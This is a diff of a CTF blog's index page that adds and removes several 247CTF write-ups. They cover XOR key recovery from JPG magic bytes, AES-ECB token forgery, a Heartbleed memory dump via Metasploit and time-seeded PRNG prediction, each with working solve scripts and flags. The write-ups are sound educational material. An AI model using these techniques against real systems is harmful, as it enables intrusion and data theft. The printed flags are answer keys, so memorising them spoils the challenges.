@@ -236,7 +236,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">175</span>
+          <span class="site-state-item-count">177</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -247,7 +247,7 @@ p.spoiler {
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">111</span>
+        <span class="site-state-item-count">112</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -274,6 +274,248 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/247CTF/247CTF-tips-and-tricks/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/247CTF/247CTF-tips-and-tricks/" class="post-title-link" itemprop="url">247CTF - Tips And Tricks</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-02-27 15:58:32" itemprop="dateCreated datePublished" datetime="2026-02-27T15:58:32+08:00">2026-02-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-03-06 14:01:32" itemprop="dateModified" datetime="2026-03-06T14:01:32+08:00">2026-03-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/247CTF/247CTF-tips-and-tricks/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/247CTF/247CTF-tips-and-tricks/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>Recover a XOR encryption key used to encrypt a JPG image.</p>
+<h3 id="approach">Approach</h3>
+<p>XOR encryption is vulnerable when the plaintext is partially
+known:</p>
+<ul>
+<li>JPG files have a known magic header:
+<code>FF D8 FF E0 00 10 4A 46 49 46 00 01</code></li>
+<li>XOR the encrypted header with known plaintext to recover the
+key</li>
+<li>Apply the recovered key to decrypt the entire file</li>
+</ul>
+<h3 id="solution">Solution</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> cycle</span><br><span class="line"></span><br><span class="line"><span class="comment"># JPG file magic header</span></span><br><span class="line">known_header = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;FF D8 FF E0 00 10 4A 46 49 46 00 01&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read encrypted file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;my_magic_bytes.jpg.enc&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher_data = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Extract encrypted header</span></span><br><span class="line">cipher_header = cipher_data[:<span class="number">12</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Recover XOR key: ciphertext XOR plaintext = key</span></span><br><span class="line">key = <span class="built_in">bytes</span>([c ^ p <span class="keyword">for</span> c, p <span class="keyword">in</span> <span class="built_in">zip</span>(cipher_header, known_header)])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] Calculated Key: <span class="subst">&#123;key.<span class="built_in">hex</span>().upper()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt entire file by applying repeating key</span></span><br><span class="line">decrypted_data = <span class="built_in">bytes</span>([c ^ k <span class="keyword">for</span> c, k <span class="keyword">in</span> <span class="built_in">zip</span>(cipher_data, cycle(key))])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save decrypted image</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.jpg&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(decrypted_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Decrypted! Check flag.jpg&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="key-insight">Key Insight</h3>
+<p>When XOR encrypts known file formats (JPG, PNG, ZIP, etc.), the magic
+bytes provide enough information to recover the key without brute
+force.</p>
+<h2 id="flag">Flag</h2>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">247CTF{ca4e3b7f913ca7ca8f33fb0504f2947f}</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/247CTF/247CTF-the-impossible-user/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/247CTF/247CTF-the-impossible-user/" class="post-title-link" itemprop="url">247CTF - The Impossible User</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-02-27 15:56:30" itemprop="dateCreated datePublished" datetime="2026-02-27T15:56:30+08:00">2026-02-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-03-06 14:01:32" itemprop="dateModified" datetime="2026-03-06T14:01:32+08:00">2026-03-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/247CTF/247CTF-the-impossible-user/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/247CTF/247CTF-the-impossible-user/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>An encryption service encrypts plaintext, but blocks encryption of
+the <code>impossible_flag_user</code> string. Exploit the ECB mode
+implementation to forge an encrypted token that decrypts to this
+forbidden value.</p>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>The service uses <strong>AES in ECB mode</strong>, which has critical
+weakness: identical plaintext blocks produce identical ciphertext
+blocks. By crafting specific payloads, we can:</p>
+<ol type="1">
+<li>Encrypt the first 16 bytes of the target string</li>
+<li>Encrypt padding-aligned subsequent bytes</li>
+<li>Concatenate the cipher blocks to forge a valid token</li>
+</ol>
+<h2 id="exploit-strategy">Exploit Strategy</h2>
+<p>The target user is: <code>impossible_flag_user</code> (23 bytes)</p>
+<ol type="1">
+<li><strong>Block 1</strong>: Encrypt <code>impossible_flag_</code> (16
+bytes) → get first cipher block</li>
+<li><strong>Block 2</strong>: Encrypt <code>user</code> + PKCS#7 padding
+→ get second cipher block</li>
+<li><strong>Combine</strong>: Concatenate blocks to form forged token →
+decrypt equals target</li>
+</ol>
+<h2 id="solution">Solution</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;https://2c5a74f7cc3f1fdf.247ctf.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="comment"># Block 1: First 16 bytes of target</span></span><br><span class="line">    part1_plain = <span class="string">b&quot;impossible_flag_&quot;</span></span><br><span class="line">    payload1 = binascii.hexlify(part1_plain).decode()</span><br><span class="line">    r1 = requests.get(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/encrypt?user=<span class="subst">&#123;payload1&#125;</span>&quot;</span>)</span><br><span class="line">    cipher_part1 = r1.text[:<span class="number">32</span>]  <span class="comment"># 32 hex chars = 16 bytes</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Block 1 Cipher: <span class="subst">&#123;cipher_part1&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Block 2: Remaining 7 bytes + PKCS#7 padding to 16 bytes</span></span><br><span class="line">    padding_len = <span class="number">16</span> - (<span class="number">23</span> % <span class="number">16</span>) <span class="comment"># target is 23 bytes, part 2 is 7 bytes. 16 - 7 = 9.</span></span><br><span class="line">    part2_plain = <span class="string">b&quot;user&quot;</span> + <span class="built_in">bytes</span>([padding_len] * padding_len)</span><br><span class="line">    payload2 = binascii.hexlify(part2_plain).decode()</span><br><span class="line">    r2 = requests.get(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/encrypt?user=<span class="subst">&#123;payload2&#125;</span>&quot;</span>)</span><br><span class="line">    cipher_part2 = r2.text[:<span class="number">32</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Block 2 Cipher: <span class="subst">&#123;cipher_part2&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Forge token by concatenating blocks</span></span><br><span class="line">    final_token = cipher_part1 + cipher_part2</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Forged Token: <span class="subst">&#123;final_token&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Get flag</span></span><br><span class="line">    r_flag = requests.get(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/get_flag?user=<span class="subst">&#123;final_token&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n---&gt; FLAG: <span class="subst">&#123;r_flag.text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure>
+<h2 id="flag">Flag</h2>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">247CTF{ddd01e396dc1965c3fcf943f3968aa39}</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1186,244 +1428,6 @@ functions. Common passwords can be cracked with a good wordlist.</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl enc -d -aes-256-cbc -<span class="keyword">in</span> encrypted_flag.enc -pass pass:<span class="string">&quot;Vamos!&quot;</span> -out flag</span><br></pre></td></tr></table></figure>
 <h2 id="flag">Flag</h2>
 <span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">247CTF{flag_content_here}</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/247CTF/247CTF-sensitive-server-memory/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/247CTF/247CTF-sensitive-server-memory/" class="post-title-link" itemprop="url">247CTF - Sensitive Server Memory</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-02-26 22:40:39" itemprop="dateCreated datePublished" datetime="2026-02-26T22:40:39+08:00">2026-02-26</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-03-06 14:01:32" itemprop="dateModified" datetime="2026-03-06T14:01:32+08:00">2026-03-06</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/247CTF/247CTF-sensitive-server-memory/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/247CTF/247CTF-sensitive-server-memory/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>A webserver is storing sensitive data in memory. Exploit a known
-vulnerability to read it.</p>
-<h2 id="vulnerability">Vulnerability</h2>
-<p><strong>Heartbleed (CVE-2014-0160)</strong> - A critical
-vulnerability in OpenSSL that allows reading server memory without
-authentication. The vulnerability exploits the TLS heartbeat mechanism
-to leak sensitive information including private keys, session tokens,
-user data, and flags.</p>
-<h2 id="solution">Solution</h2>
-<p>Use Metasploit’s Heartbleed scanner module:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf &gt; use auxiliary/scanner/ssl/openssl_heartbleed</span><br><span class="line">msf auxiliary(scanner/ssl/openssl_heartbleed) &gt; <span class="built_in">set</span> RHOSTS 95fe58ed8b8d1ce7.247ctf.com</span><br><span class="line">msf auxiliary(scanner/ssl/openssl_heartbleed) &gt; <span class="built_in">set</span> RPORT 50326</span><br><span class="line">...</span><br><span class="line">msf auxiliary(scanner/ssl/openssl_heartbleed) &gt; run</span><br></pre></td></tr></table></figure>
-<p>The module will dump server memory, which contains the flag.</p>
-<h2 id="flag">Flag</h2>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">247CTF{4ba37501598f5687d266a8d127c4badf}</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/247CTF/247CTF-the-flag-lottery/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/247CTF/247CTF-the-flag-lottery/" class="post-title-link" itemprop="url">247CTF - The Flag Lottery</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-02-26 22:40:39" itemprop="dateCreated datePublished" datetime="2026-02-26T22:40:39+08:00">2026-02-26</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-03-06 14:01:32" itemprop="dateModified" datetime="2026-03-06T14:01:32+08:00">2026-03-06</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/247CTF/247CTF-the-flag-lottery/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/247CTF/247CTF-the-flag-lottery/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>Guess a random number to win the flag lottery. The server generates
-the winning number using a seeded PRNG.</p>
-<h2 id="vulnerability">Vulnerability</h2>
-<p>The server seeds the random number generator with the current Unix
-timestamp, which is predictable. Additionally, Python 2 and Python 3
-have different PRNG implementations and string conversion behaviors.</p>
-<h2 id="solution">Solution</h2>
-<p>The server code is vulnerable because:</p>
-<ol type="1">
-<li><strong>Predictable seed</strong>: Unix timestamp is public
-knowledge</li>
-<li><strong>Time window</strong>: Even if time is slightly off, we can
-try nearby timestamps</li>
-<li><strong>Version differences</strong>: Python 2’s <code>str()</code>
-truncates floats, making predictions consistent</li>
-</ol>
-<p>Use Python 2 to generate predictions for timestamps around the
-server’s current time:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;13721472f3c35e88.247ctf.com&quot;</span></span><br><span class="line">port = <span class="number">50316</span></span><br><span class="line">context.log_level = <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Try timestamps within a ±10 second window</span></span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">    r = remote(host, port)</span><br><span class="line">    prompt = r.recvline()</span><br><span class="line">    </span><br><span class="line">    target_time = <span class="built_in">int</span>(time.time()) + offset</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Generate number using Python 2 seeding</span></span><br><span class="line">    cmd = [<span class="string">&quot;python2&quot;</span>, <span class="string">&quot;get_legacy_random.py&quot;</span>, <span class="built_in">str</span>(target_time)]</span><br><span class="line">    payload = subprocess.check_output(cmd).decode().strip()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Predicting for time <span class="subst">&#123;target_time&#125;</span> (offset +<span class="subst">&#123;offset&#125;</span>s): <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    r.sendline(payload.encode())</span><br><span class="line">    response = r.recvall().decode()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;247&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[SUCCESS] <span class="subst">&#123;response.strip()&#125;</span>&quot;</span>)</span><br><span class="line">        r.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Failed: <span class="subst">&#123;response.strip()&#125;</span>&quot;</span>)</span><br><span class="line">        r.close()</span><br></pre></td></tr></table></figure>
-<p>Helper script (<code>get_legacy_random.py</code>):</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">target_time = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">secret = random.Random()</span><br><span class="line">secret.seed(target_time)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">str</span>(secret.random())</span><br></pre></td></tr></table></figure>
-<h2 id="key-insight">Key Insight</h2>
-<p>PRNGs seeded with time are not cryptographically secure. Use
-<code>secrets</code> or <code>os.urandom()</code> for security-sensitive
-randomness. Additionally, always be aware of version-specific
-differences in language implementations when predicting values.</p>
-<h2 id="flag">Flag</h2>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">247CTF{3c435fe8a89cb0c65fdfcf0089669808}</span></span>
 
       
     </div>
